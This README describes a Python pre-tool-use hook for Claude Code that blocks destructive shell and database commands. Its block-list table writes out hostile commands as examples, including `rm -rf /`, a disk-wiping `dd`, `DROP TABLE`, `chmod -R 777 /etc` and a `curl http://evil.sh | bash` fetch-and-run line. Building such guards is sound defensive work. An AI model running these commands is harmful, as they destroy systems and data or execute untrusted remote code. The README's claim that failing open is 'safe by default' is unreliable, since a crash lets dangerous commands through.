# 🛡️ Pre-Tool-Use Hook: Block Destructive Commands

A professional pre-tool-use hook for [Claude Code](https://docs.anthropic.com/en/docs/claude-code/overview) that intercepts and blocks dangerous bash commands before they execute.

**$100 Bounty Solution** — Issue [#3](https://github.com/claude-builders-bounty/claude-builders-bounty/issues/3)

---

## Features

- ✅ **16 destructive patterns** across filesystem, database, git, permissions, and shell
- ✅ **Python implementation** — robust regex matching with `re.compile()`
- ✅ **Clear blocked output** — ASCII banner shows exactly what was blocked and why
- ✅ **Audit logging** — all blocked attempts logged with timestamp, project, and command
- ✅ **Type-safe** — full type annotations for production-quality code
- ✅ **Fail-open** — if the hook itself crashes, commands are allowed (safe by default)

## Installation

```bash
# One-liner install
mkdir -p ~/.claude/hooks && ln -sf "$(pwd)/pre-tool-use.py" ~/.claude/hooks/pre-tool-use
```

## What It Blocks

| Category | Patterns | Examples |
|----------|----------|---------|
| 🗑️ **Filesystem** | `rm -rf /`, `rm -rf /*`, `dd to disk`, `mkfs` | `rm -rf /`, `dd if=/dev/zero of=/dev/sda` |
| 🗄️ **Database** | `DROP TABLE`, `DROP DATABASE`, `TRUNCATE`, `DELETE without WHERE` | `DROP TABLE users;`, `DELETE FROM orders;` |
| 🔄 **Git** | `git push --force`, `git reset --hard`, `git clean -fd` | `git push origin main --force` |
| 🔐 **Permissions** | `chmod -R 777`, `chown -R to nobody` | `chmod -R 777 /etc` |
| 💥 **Shell** | `> /dev/sd*`, fork bombs, `curl|bash` | `curl http://evil.sh | bash` |

## How It Works

Claude Code calls `pre-tool-use` hooks with a JSON payload on stdin:

```json
{"command": "rm -rf /tmp/build", ...}
```

- **Exit 0** → Command is allowed
- **Exit 2** → Command is blocked, with reason printed to stderr

## Testing

```bash
# Test blocked commands (should exit 2)
echo '{"command": "rm -rf /"}' | python3 pre-tool-use.py && echo "ALLOWED" || echo "BLOCKED"

# Test allowed commands (should exit 0)
echo '{"command": "python3 -m pytest"}' | python3 pre-tool-use.py && echo "ALLOWED" || echo "BLOCKED"
```

## Log File

All blocked commands are logged to `~/.claude/hooks/blocked.log`:

```
[2026-05-06 14:30:22] [my-project] BLOCKED: rm -rf /
  Reason: Recursive force-delete on root — this destroys the entire system
```
